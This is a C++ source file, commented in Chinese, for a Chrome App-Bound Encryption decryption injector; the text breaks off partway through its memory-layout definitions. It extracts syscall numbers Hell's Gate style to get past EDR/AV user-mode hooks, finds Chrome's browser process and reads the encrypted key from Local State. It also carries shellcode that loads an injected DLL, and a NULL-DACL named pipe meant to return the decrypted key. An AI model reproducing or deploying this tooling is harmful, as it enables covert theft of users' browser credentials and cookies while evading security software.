/*
 * injector.cpp  —  Chrome App-Bound Encryption (ABE) 解密注入器
 *
 * 用途：将 payload_dll.dll 注入到 Chrome 浏览器主进程，
 *       利用 IElevator COM 接口完成 ABE 密钥解密并通过命名管道返回明文。
 *
 * 技术要点：
 *   1. Hell's Gate 直接系统调用（绕过用户态 Hook）
 *   2. 两阶段加载（shellcode 引导 → DLL 入口）
 *   3. 命名管道传递结果（NULL DACL 保证跨会话/跨完整性级别通信）
 *   4. 共享内存槽读取 64 位 hModule（避免 GetExitCodeThread 截断）
 *
 * 编译：见 build.ps1
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>       // UNICODE_STRING, OBJECT_ATTRIBUTES 等内核结构
#include <tlhelp32.h>       // CreateToolhelp32Snapshot / Process32FirstW
#include <shlwapi.h>        // PathFindFileNameW（用于调试输出，可选）
#include <psapi.h>          // GetModuleFileNameExW（可选）
#include <sddl.h>           // ConvertStringSecurityDescriptorToSecurityDescriptorW
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================
// § 1  类型别名 & 内核 API 原型
// ============================================================
//
// Windows 提供的 NT 原生 API（Nt* 系列）并不在任何公开的 import lib 中导出。
// 正确做法是在运行时通过 GetProcAddress 从 ntdll.dll 中动态获取函数指针，
// 或者用 Hell's Gate 技术直接调用系统调用号（SSN）。
// 这里先声明函数原型，方便后续类型转换。

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)       ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS      ((NTSTATUS)0x00000000L)

// NtAllocateVirtualMemory：在目标进程中申请虚拟内存页
typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG   AllocationType,
    ULONG   Protect
);

// NtWriteVirtualMemory：将数据写入目标进程的内存
typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfOfBytesWritten
);

// NtCreateThreadEx：在目标进程中创建远程线程
// 比 CreateRemoteThread 更底层，可绕过某些用户态拦截策略
typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
    PHANDLE         ThreadHandle,
    ACCESS_MASK     DesiredAccess,
    LPVOID          ObjectAttributes,
    HANDLE          ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID          Argument,
    ULONG           CreateFlags,
    SIZE_T          ZeroBits,
    SIZE_T          StackSize,
    SIZE_T          MaximumStackSize,
    LPVOID          AttributeList
);

// NtProtectVirtualMemory：修改内存页的保护属性
typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);

// NtOpenProcess：打开目标进程，获取句柄
typedef NTSTATUS (NTAPI *pfnNtOpenProcess)(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId
);

// ============================================================
// § 2  Hell's Gate 直接系统调用
// ============================================================
//
// 【为什么不直接用 CreateRemoteThread / VirtualAllocEx？】
//
// 主流 EDR/AV 产品会在用户态对 kernel32.dll 和 ntdll.dll 中的高危函数
// 打 "inline hook"（将函数前几字节替换为跳转到扫描引擎的 JMP 指令）。
//
// Hell's Gate 的思路：
//   1. 直接解析 ntdll.dll 内存镜像，找到 Nt* 函数的真实字节序列。
//   2. 从中提取系统调用号（SSN，即 EAX 寄存器的值，0x18~0x1FF 范围内）。
//   3. 找到 ntdll 中一个合法的 "syscall; ret" 指令序列（gadget）。
//   4. 在进程内构造一段迷你 trampoline（蹦床）代码，直接执行 syscall。
//
// 这样，即使 ntdll 被 hook，只要 hook 没有破坏 SSN 所在的字节，
// 我们就能绕过 hook，直接进入内核。

// Hell's Gate 上下文，保存单个系统调用的 SSN 和 gadget 地址
typedef struct _SYSCALL_ENTRY {
    DWORD   dwSSN;          // 系统调用号（System Service Number）
    PVOID   pSyscallGadget; // ntdll 中 "syscall; ret" 指令的地址
} SYSCALL_ENTRY;

// 我们需要的全部系统调用
typedef struct _SYSCALL_TABLE {
    SYSCALL_ENTRY NtAllocateVirtualMemory;
    SYSCALL_ENTRY NtWriteVirtualMemory;
    SYSCALL_ENTRY NtCreateThreadEx;
    SYSCALL_ENTRY NtProtectVirtualMemory;
    SYSCALL_ENTRY NtOpenProcess;
} SYSCALL_TABLE;

static SYSCALL_TABLE g_SysTable = {};

// 通用 trampoline 模板（x64）
// 运行时会把 SSN 和 syscall gadget 地址填入对应的占位字节
//
// 指令序列：
//   mov r10, rcx       ; Windows x64 ABI 要求：syscall 前 rcx→r10
//   mov eax, <SSN>     ; 将系统调用号载入 EAX
//   jmp <gadget>       ; 跳转到 ntdll 中真实的 "syscall; ret"
//
// 注意：jmp 使用绝对地址（14 字节序列：FF 25 00000000 + 8 字节地址），
// 这样不依赖 RIP 相对偏移，方便在任意内存位置动态生成。

#pragma pack(push, 1)
typedef struct _TRAMPOLINE {
    // mov r10, rcx  (REX.B prefix + 0x48 0x89 0xCA → 4D 8B CA 其实是 mov r10,rcx)
    BYTE  mov_r10_rcx[3]; // 4C 8B D1
    // mov eax, imm32
    BYTE  mov_eax;        // B8
    DWORD ssn;            // <SSN>
    // jmp [rip+0]
    BYTE  jmp_abs[2];     // FF 25
    DWORD jmp_rip_rel;    // 00 00 00 00  (RIP 相对偏移 = 0，即紧随其后)
    UINT64 gadget_addr;   // 8 字节绝对地址
} TRAMPOLINE;
#pragma pack(pop)

// 为一个 SYSCALL_ENTRY 分配并初始化可执行的 trampoline
// 返回 trampoline 函数指针（调用约定与原始 Nt* 函数相同）
static PVOID AllocTrampoline(const SYSCALL_ENTRY *e)
{
    // 分配可读写内存，稍后改为可执行
    PVOID mem = VirtualAlloc(NULL, sizeof(TRAMPOLINE),
                             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return NULL;

    TRAMPOLINE *t = (TRAMPOLINE *)mem;
    // mov r10, rcx
    t->mov_r10_rcx[0] = 0x4C;
    t->mov_r10_rcx[1] = 0x8B;
    t->mov_r10_rcx[2] = 0xD1;
    // mov eax, ssn
    t->mov_eax  = 0xB8;
    t->ssn      = e->dwSSN;
    // jmp [rip+0]
    t->jmp_abs[0]  = 0xFF;
    t->jmp_abs[1]  = 0x25;
    t->jmp_rip_rel = 0x00000000; // RIP 此时指向 gadget_addr 字段
    t->gadget_addr = (UINT64)(ULONG_PTR)e->pSyscallGadget;

    // 改为可读执行（不可写），防止 DEP 报错
    DWORD oldProt;
    VirtualProtect(mem, sizeof(TRAMPOLINE), PAGE_EXECUTE_READ, &oldProt);
    return mem;
}

// 从 ntdll.dll 内存镜像中提取指定函数的 SSN 和 syscall gadget
// 参数：
//   funcName  —— 函数名（ASCII）
//   entry     —— 输出：填充 SSN 和 gadget 地址
static BOOL ExtractSyscallEntry(const char *funcName, SYSCALL_ENTRY *entry)
{
    // Step 1：获取 ntdll.dll 的加载基址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Step 2：通过 PE 导出表定位函数地址
    BYTE *pBase = (BYTE *)hNtdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pBase;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(pBase + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *expDir = (IMAGE_EXPORT_DIRECTORY *)(
        pBase + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *names    = (DWORD *)(pBase + expDir->AddressOfNames);
    WORD  *ordinals = (WORD  *)(pBase + expDir->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(pBase + expDir->AddressOfFunctions);

    BYTE *pFunc = NULL;
    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        if (_stricmp((char *)(pBase + names[i]), funcName) == 0) {
            pFunc = pBase + funcs[ordinals[i]];
            break;
        }
    }
    if (!pFunc) return FALSE;

    // Step 3：提取 SSN
    // 正常（未被 hook）的 Nt* 函数前几字节形如：
    //   4C 8B D1          mov r10, rcx
    //   B8 XX 00 00 00    mov eax, <SSN>   ← 我们要的是 XX（低字节就是 SSN）
    //   ...
    //
    // 如果被 hook，前几字节可能是 E9（JMP）或 CC（INT3）。
    // 简单处理：如果前 4 字节不符合预期，向前扫描最多 32 字节寻找 "B8 ?? 00 00 00"。
    DWORD ssn = 0;
    BOOL  found = FALSE;

    // 快路径：标准布局
    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 &&
        pFunc[3] == 0xB8) {
        ssn   = *(DWORD *)(pFunc + 4);
        found = TRUE;
    } else {
        // 慢路径：函数被 hook，尝试向前扫描（某些 EDR 保留了 SSN 字节）
        for (int offset = 0; offset < 32; offset++) {
            if (pFunc[offset] == 0xB8 &&
                pFunc[offset + 2] == 0x00 &&
                pFunc[offset + 3] == 0x00 &&
                pFunc[offset + 4] == 0x00) {
                ssn   = *(DWORD *)(pFunc + offset + 1);
                found = TRUE;
                break;
            }
        }
    }
    if (!found) return FALSE;

    // Step 4：在 ntdll 的 .text 段中搜索 "syscall; ret" gadget
    // syscall = 0F 05
    // ret     = C3
    //
    // 为什么要用 ntdll 内部的 gadget 而不是自己构造？
    // 因为某些内核补丁（PatchGuard 衍生品、Hypervisor-based 保护）会检查
    // RIP 来源是否在合法模块范围内。使用 ntdll 内的合法指令地址可以规避此检查。
    IMAGE_SECTION_HEADER *sect = IMAGE_FIRST_SECTION(nt);
    for (WORD s = 0; s < nt->FileHeader.NumberOfSections; s++, sect++) {
        if (memcmp(sect->Name, ".text", 5) != 0) continue;
        BYTE *start = pBase + sect->VirtualAddress;
        BYTE *end   = start + sect->Misc.VirtualSize - 2;
        for (BYTE *p = start; p < end; p++) {
            if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
                entry->pSyscallGadget = p;
                entry->dwSSN          = ssn;
                return TRUE;
            }
        }
    }
    return FALSE;
}

// 初始化全局系统调用表
// 必须在任何其他操作之前调用
static BOOL InitDirectSyscall(void)
{
    struct { const char *name; SYSCALL_ENTRY *entry; } table[] = {
        { "NtAllocateVirtualMemory", &g_SysTable.NtAllocateVirtualMemory },
        { "NtWriteVirtualMemory",    &g_SysTable.NtWriteVirtualMemory    },
        { "NtCreateThreadEx",        &g_SysTable.NtCreateThreadEx        },
        { "NtProtectVirtualMemory",  &g_SysTable.NtProtectVirtualMemory  },
        { "NtOpenProcess",           &g_SysTable.NtOpenProcess           },
    };
    for (int i = 0; i < 5; i++) {
        if (!ExtractSyscallEntry(table[i].name, table[i].entry)) {
            wprintf(L"[-] 无法提取系统调用: %hs\n", table[i].name);
            return FALSE;
        }
    }
    return TRUE;
}

// ============================================================
// § 3  直接系统调用包装函数
// ============================================================
//
// 通过动态生成的 trampoline 调用内核，完全绕过用户态 hook。

static NTSTATUS DirectNtAllocateVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG   AllocationType,
    ULONG   Protect)
{
    PVOID tramp = AllocTrampoline(&g_SysTable.NtAllocateVirtualMemory);
    if (!tramp) return (NTSTATUS)0xC0000001; // STATUS_UNSUCCESSFUL
    pfnNtAllocateVirtualMemory fn = (pfnNtAllocateVirtualMemory)tramp;
    NTSTATUS st = fn(ProcessHandle, BaseAddress, ZeroBits,
                     RegionSize, AllocationType, Protect);
    VirtualFree(tramp, 0, MEM_RELEASE);
    return st;
}

static NTSTATUS DirectNtWriteVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    PVOID   Buffer,
    SIZE_T  NumberOfBytesToWrite,
    PSIZE_T NumberOfOfBytesWritten)
{
    PVOID tramp = AllocTrampoline(&g_SysTable.NtWriteVirtualMemory);
    if (!tramp) return (NTSTATUS)0xC0000001;
    pfnNtWriteVirtualMemory fn = (pfnNtWriteVirtualMemory)tramp;
    NTSTATUS st = fn(ProcessHandle, BaseAddress, Buffer,
                     NumberOfBytesToWrite, NumberOfOfBytesWritten);
    VirtualFree(tramp, 0, MEM_RELEASE);
    return st;
}

static NTSTATUS DirectNtCreateThreadEx(
    PHANDLE         ThreadHandle,
    ACCESS_MASK     DesiredAccess,
    LPVOID          ObjectAttributes,
    HANDLE          ProcessHandle,
    LPTHREAD_START_ROUTINE StartRoutine,
    LPVOID          Argument,
    ULONG           CreateFlags,
    SIZE_T          ZeroBits,
    SIZE_T          StackSize,
    SIZE_T          MaximumStackSize,
    LPVOID          AttributeList)
{
    PVOID tramp = AllocTrampoline(&g_SysTable.NtCreateThreadEx);
    if (!tramp) return (NTSTATUS)0xC0000001;
    pfnNtCreateThreadEx fn = (pfnNtCreateThreadEx)tramp;
    NTSTATUS st = fn(ThreadHandle, DesiredAccess, ObjectAttributes,
                     ProcessHandle, StartRoutine, Argument, CreateFlags,
                     ZeroBits, StackSize, MaximumStackSize, AttributeList);
    VirtualFree(tramp, 0, MEM_RELEASE);
    return st;
}

static NTSTATUS DirectNtProtectVirtualMemory(
    HANDLE  ProcessHandle,
    PVOID  *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect)
{
    PVOID tramp = AllocTrampoline(&g_SysTable.NtProtectVirtualMemory);
    if (!tramp) return (NTSTATUS)0xC0000001;
    pfnNtProtectVirtualMemory fn = (pfnNtProtectVirtualMemory)tramp;
    NTSTATUS st = fn(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    VirtualFree(tramp, 0, MEM_RELEASE);
    return st;
}

static NTSTATUS DirectNtOpenProcess(
    PHANDLE            ProcessHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID         ClientId)
{
    PVOID tramp = AllocTrampoline(&g_SysTable.NtOpenProcess);
    if (!tramp) return (NTSTATUS)0xC0000001;
    pfnNtOpenProcess fn = (pfnNtOpenProcess)tramp;
    NTSTATUS st = fn(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    VirtualFree(tramp, 0, MEM_RELEASE);
    return st;
}

// ============================================================
// § 4  查找 Chrome 浏览器主进程 PID
// ============================================================
//
// Chrome 的进程树结构：
//
//   chrome.exe (browser/主进程)   ← 我们需要的
//       └── chrome.exe (GPU)
//       └── chrome.exe (renderer) × N
//       └── chrome.exe (utility)
//
// 区分标准：浏览器主进程的父进程 PID 不是另一个 chrome.exe。
// 所有子进程（renderer、GPU、utility）的父进程都是浏览器主进程。
//
// 实现步骤：
//   1. 枚举所有进程，收集所有 chrome.exe 的 PID 集合。
//   2. 再次枚举，找到父进程 PID 不在 chrome.exe 集合中的那个 chrome.exe。

static DWORD FindChromeBrowserPid(void)
{
    // 第一次扫描：收集所有 chrome.exe 的 PID
    HANDLE snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap1 == INVALID_HANDLE_VALUE) return 0;

    // 动态数组存储所有 chrome PID（最多 512 个子进程，实际不会这么多）
    DWORD chromePids[512] = {};
    int   chromeCount = 0;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap1, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0) {
                if (chromeCount < 512)
                    chromePids[chromeCount++] = pe.th32ProcessID;
            }
        } while (Process32NextW(snap1, &pe));
    }
    CloseHandle(snap1);

    if (chromeCount == 0) {
        wprintf(L"[-] 未找到任何 chrome.exe 进程，请先启动 Chrome\n");
        return 0;
    }

    // 第二次扫描：找到父进程不是 chrome.exe 的那个 chrome.exe
    HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap2 == INVALID_HANDLE_VALUE) return 0;

    DWORD browserPid = 0;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap2, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"chrome.exe") == 0) {
                // 检查父进程是否也是 chrome.exe
                BOOL parentIsChrome = FALSE;
                for (int i = 0; i < chromeCount; i++) {
                    if (chromePids[i] == pe.th32ParentProcessID) {
                        parentIsChrome = TRUE;
                        break;
                    }
                }
                if (!parentIsChrome) {
                    // 父进程不是 chrome → 这就是浏览器主进程
                    browserPid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(snap2, &pe));
    }
    CloseHandle(snap2);

    if (browserPid == 0)
        wprintf(L"[-] 无法确定 Chrome 主进程（所有 chrome.exe 的父进程都是 chrome？）\n");

    return browserPid;
}

// ============================================================
// § 5  从磁盘读取 Payload DLL
// ============================================================

static BYTE *LoadPayloadDll(const wchar_t *dllPath, SIZE_T *outSize)
{
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] 无法打开 DLL 文件: %s (错误 %lu)\n",
                dllPath, GetLastError());
        return NULL;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return NULL;
    }

    *outSize = (SIZE_T)fileSize.QuadPart;
    BYTE *buf = (BYTE *)malloc(*outSize);
    if (!buf) { CloseHandle(hFile); return NULL; }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buf, (DWORD)*outSize, &bytesRead, NULL) ||
        bytesRead != (DWORD)*outSize) {
        free(buf);
        CloseHandle(hFile);
        return NULL;
    }
    CloseHandle(hFile);
    return buf;
}

// ============================================================
// § 6  解析 PE 导出表，获取指定导出函数的 RVA
// ============================================================
//
// 为什么需要 RVA 而不是 VA？
// 因为 DLL 注入后在目标进程中的加载基址是不确定的（ASLR），
// 我们必须知道函数相对于 DLL 基址的偏移（RVA），
// 然后在运行时加上目标进程中 DLL 的实际基址，才能得到可调用地址。

static DWORD GetExportRVA(const BYTE *dllBytes, const char *funcName)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)dllBytes;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(dllBytes + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD expDirRVA = nt->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!expDirRVA) return 0;

    // 注意：dllBytes 是文件映像（非内存映像），RVA 转文件偏移需要节表查找
    // 这里假设文件对齐 == 内存对齐（大多数 DLL 如此）
    // 如果不是，需要实现 RVA-to-FileOffset 转换（本实现保持简洁）
    IMAGE_EXPORT_DIRECTORY *expDir =
        (IMAGE_EXPORT_DIRECTORY *)(dllBytes + expDirRVA);

    DWORD *names    = (DWORD *)(dllBytes + expDir->AddressOfNames);
    WORD  *ordinals = (WORD  *)(dllBytes + expDir->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(dllBytes + expDir->AddressOfFunctions);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        const char *name = (const char *)(dllBytes + names[i]);
        if (_stricmp(name, funcName) == 0) {
            return funcs[ordinals[i]]; // 返回 RVA
        }
    }
    return 0;
}

// ============================================================
// § 7  读取并解码加密密钥
// ============================================================
//
// Chrome 将 ABE 密钥存储在用户数据目录的 Local State 文件中，
// JSON 路径为 os_crypt.app_bound_encrypted_key。
// 值为 Base64 编码的二进制，前 4 字节是版本/标记前缀（需剥离）。
//
// 典型路径：
//   %LOCALAPPDATA%\Google\Chrome\User Data\Local State

// 简易 Base64 解码（仅处理标准字母表，不做严格错误检查）
static BYTE b64Table[256] = {};
static BOOL b64Inited = FALSE;

static void InitBase64Table(void)
{
    if (b64Inited) return;
    const char *chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; i < 64; i++)
        b64Table[(unsigned char)chars[i]] = (BYTE)i;
    b64Inited = TRUE;
}

// 返回解码后的字节数，outBuf 由调用方提供（大小至少 3/4 * inLen）
static SIZE_T Base64Decode(const char *in, SIZE_T inLen, BYTE *outBuf)
{
    InitBase64Table();
    SIZE_T outLen = 0;
    for (SIZE_T i = 0; i + 3 < inLen; i += 4) {
        BYTE a = b64Table[(unsigned char)in[i]];
        BYTE b = b64Table[(unsigned char)in[i+1]];
        BYTE c = b64Table[(unsigned char)in[i+2]];
        BYTE d = b64Table[(unsigned char)in[i+3]];
        outBuf[outLen++] = (a << 2) | (b >> 4);
        if (in[i+2] != '=') outBuf[outLen++] = (b << 4) | (c >> 2);
        if (in[i+3] != '=') outBuf[outLen++] = (c << 6) | d;
    }
    return outLen;
}

// 读取 Local State，提取并解码 app_bound_encrypted_key
// 返回 malloc 的字节缓冲区（调用方负责 free），*outLen 为有效字节数（已剥离前缀）
static BYTE *ReadEncryptedKey(SIZE_T *outLen)
{
    // 构造 Local State 路径
    wchar_t localState[MAX_PATH];
    if (!ExpandEnvironmentStringsW(
            L"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State",
            localState, MAX_PATH)) {
        wprintf(L"[-] 无法展开 LOCALAPPDATA\n");
        return NULL;
    }

    HANDLE hFile = CreateFileW(localState, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] 无法打开 Local State: %s\n", localState);
        return NULL;
    }

    LARGE_INTEGER sz;
    GetFileSizeEx(hFile, &sz);
    char *jsonBuf = (char *)malloc((SIZE_T)sz.QuadPart + 1);
    if (!jsonBuf) { CloseHandle(hFile); return NULL; }

    DWORD rd = 0;
    ReadFile(hFile, jsonBuf, (DWORD)sz.QuadPart, &rd, NULL);
    jsonBuf[rd] = '\0';
    CloseHandle(hFile);

    // 简单字符串搜索（不用完整 JSON 解析器）
    // 寻找 "app_bound_encrypted_key":"<base64>"
    const char *key = "\"app_bound_encrypted_key\":\"";
    char *pos = strstr(jsonBuf, key);
    if (!pos) {
        wprintf(L"[-] Local State 中未找到 app_bound_encrypted_key\n");
        free(jsonBuf);
        return NULL;
    }
    pos += strlen(key);

    char *end = strchr(pos, '"');
    if (!end) { free(jsonBuf); return NULL; }
    SIZE_T b64Len = (SIZE_T)(end - pos);

    // Base64 解码
    SIZE_T maxDecoded = b64Len / 4 * 3 + 4;
    BYTE *decoded = (BYTE *)malloc(maxDecoded);
    if (!decoded) { free(jsonBuf); return NULL; }

    SIZE_T decodedLen = Base64Decode(pos, b64Len, decoded);
    free(jsonBuf);

    // 剥离前 4 字节版本前缀
    // Chrome 在加密密钥前添加 "APPB" (0x41 0x50 0x50 0x42) 或版本字节作为标记
    if (decodedLen <= 4) {
        wprintf(L"[-] 解码后数据太短（%zu 字节）\n", decodedLen);
        free(decoded);
        return NULL;
    }

    *outLen = decodedLen - 4;
    BYTE *result = (BYTE *)malloc(*outLen);
    if (!result) { free(decoded); return NULL; }
    memcpy(result, decoded + 4, *outLen);
    free(decoded);

    wprintf(L"[+] 读取加密密钥成功，有效字节数: %zu\n", *outLen);
    return result;
}

// ============================================================
// § 8  命名管道创建（NULL DACL）
// ============================================================
//
// 【为什么必须使用 NULL DACL？】
//
// 注入器运行在注入器进程（通常是管理员会话，中/高完整性级别），
// 而 payload DLL 运行在 Chrome 主进程中（通常也是中/高完整性级别，
// 但在某些配置下可能是低完整性或不同会话）。
//
// Windows 命名管道默认的 DACL 只允许创建者（和管理员）访问。
// 如果 Chrome 的安全令牌与注入器不同（例如不同登录会话，或经过 UAC 提权），
// payload 进程将无法连接到管道，导致通信失败。
//
// NULL DACL = "所有人都可以访问" ← 这是有意为之的，因为：
//   a) 管道名称本身已经足够随机，知道名称才能连接
//   b) 管道是单向读取的，不涉及权限提升
//   c) 通信完成后管道立即关闭
//
// SACL（系统 ACL）留空也是正确的，不需要审计日志。

static HANDLE CreateNullDaclPipe(const wchar_t *pipeName)
{
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    // 设置 NULL DACL：TRUE = 存在 DACL，NULL = DACL 为空（允许所有访问）
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), &sd, FALSE };

    // FILE_FLAG_OVERLAPPED 的原因见 § 9
    HANDLE hPipe = CreateNamedPipeW(
        pipeName,
        PIPE_ACCESS_INBOUND | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,          // 最多 1 个实例（只需要一次通信）
        0,          // 出站缓冲区（我们只读，不写）
        65536,      // 入站缓冲区 64 KB，足够存放解密密钥
        5000,       // 默认超时 5 秒
        &sa         // 使用 NULL DACL 安全属性
    );

    if (hPipe == INVALID_HANDLE_VALUE)
        wprintf(L"[-] CreateNamedPipe 失败: %lu\n", GetLastError());
    return hPipe;
}

// ============================================================
// § 9  FILE_FLAG_OVERLAPPED + OVERLAPPED 的原因
// ============================================================
//
// 问题：如果使用同步（阻塞）模式调用 ConnectNamedPipe，
//       注入器主线程会一直阻塞，直到 payload 连接。
//       如果 payload 注入失败、崩溃或超时，主线程将永久阻塞。
//
// 解决方案：FILE_FLAG_OVERLAPPED + OVERLAPPED 异步模式
//   1. ConnectNamedPipe 立即返回 FALSE，GetLastError() = ERROR_IO_PENDING。
//   2. 使用 WaitForSingleObject(ol.hEvent, timeout) 等待连接，可以设置超时。
//   3. 超时后可以取消 I/O 操作（CancelIo），安全退出。
//
// 这是"可超时等待"的标准 Windows 异步 I/O 模式。

static BOOL WaitForPipeClient(HANDLE hPipe, DWORD timeoutMs)
{
    OVERLAPPED ol = {};
    ol.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!ol.hEvent) return FALSE;

    BOOL connected = ConnectNamedPipe(hPipe, &ol);
    if (!connected) {
        DWORD err = GetLastError();
        if (err == ERROR_PIPE_CONNECTED) {
            // 客户端在 ConnectNamedPipe 调用前已经连接（罕见但合法）
            CloseHandle(ol.hEvent);
            return TRUE;
        }
        if (err != ERROR_IO_PENDING) {
            CloseHandle(ol.hEvent);
            return FALSE;
        }
        // 等待连接，带超时
        DWORD wait = WaitForSingleObject(ol.hEvent, timeoutMs);
        CloseHandle(ol.hEvent);
        return (wait == WAIT_OBJECT_0);
    }
    CloseHandle(ol.hEvent);
    return TRUE;
}

// ============================================================
// § 10  两阶段注入设计
// ============================================================
//
// 【为什么需要两阶段而不是直接调用 LoadLibrary？】
//
// 方案 A（简单）：
//   NtCreateThreadEx(target, LoadLibraryW, dllPath)
//   ↓
//   问题：dllPath 字符串必须在目标进程中存在（需要额外写入），
//         LoadLibraryW 从磁盘加载 DLL，留下文件系统痕迹，
//         且无法知道 DLL 何时完成初始化。
//
// 方案 B（手动内存映射）：
//   将 DLL 字节写入目标进程，调用自定义 shellcode 手动解析 PE。
//   ↓
//   实现复杂，需要处理重定位、导入表等。
//
// 方案 C（本实现：两阶段）：
//   Stage 1：小型 shellcode（仅 ~50 字节）调用 LoadLibraryW 加载 DLL。
//            DLL 路径写入目标进程的同一块内存。
//            shellcode 还将加载后的 hModule 写入共享内存槽（见 § 11）。
//   Stage 2：等待 Stage 1 完成，读取 hModule，
//            计算 PayloadEntry 的 VA，直接调用。
//
// 优势：
//   - shellcode 很短，易于调试
//   - 利用系统自带的 LoadLibraryW，无需手写 PE loader
//   - 通过共享内存获得精确的 hModule（64 位）

// Stage 1 shellcode（x64）
// 功能：调用 LoadLibraryW(dllPathPtr)，将返回的 hModule 写入 hModuleSlot
//
// 内存布局（由 InjectPayload 函数负责填充）：
//   [0x00] Stage1 shellcode 代码（约 50 字节）
//   [0x40] LoadLibraryW 的绝对地址（8 字节）
//   [0x48] hModule 输出槽（8 字节，shellcode 将结果写入此处）
//   [0x50] DLL 路径字符串（wchar_t，以 \0 结尾）
//
// shellcode 汇编（伪码）：
//   sub  rsp, 28h          ; 对齐 + shadow space
//   lea  rcx, [rip + ...]  ; rcx = DLL 路径地址
//   call qword [rip + ...] ; call LoadLibraryW
//   mov  [rip + ...], rax  ; 写入 hModule 槽
//   add  rsp, 28h
//   ret

static const BYTE kStage1Template[] = {
    // sub rsp, 0x28
    0x48, 0x83, 0xEC, 0x28,
    // lea rcx, [rip + 0x??] — 偏移在运行时填充（指向 DLL 路径）
    0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,   // [7..10] = rcx offset
    // call qword ptr [rip + 0x??]  — 偏移在运行时填充（指向 LoadLibraryW 地址槽）
    0xFF, 0x15, 0x00, 0x00, 0x00, 0x00,          // [13..16] = call offset
    // mov qword ptr [rip + 0x??], rax — 偏移在运行时填充（指向 hModule 输出槽）
    0x48, 0x89, 0x05, 0x00, 0x00, 0x00, 0x00,    // [20..23] = mov offset
    // add rsp, 0x28
    0x48, 0x83, 0xC4, 0x28,
    // ret
    0xC3
};

// 远程内存布局偏移
#define REMOTE_SHELLCODE_OFFSET   0x000   // shellcode 起始
#define REMOTE_LOADLIBW_OFFSET    0x040   // LoadLibraryW 地址槽
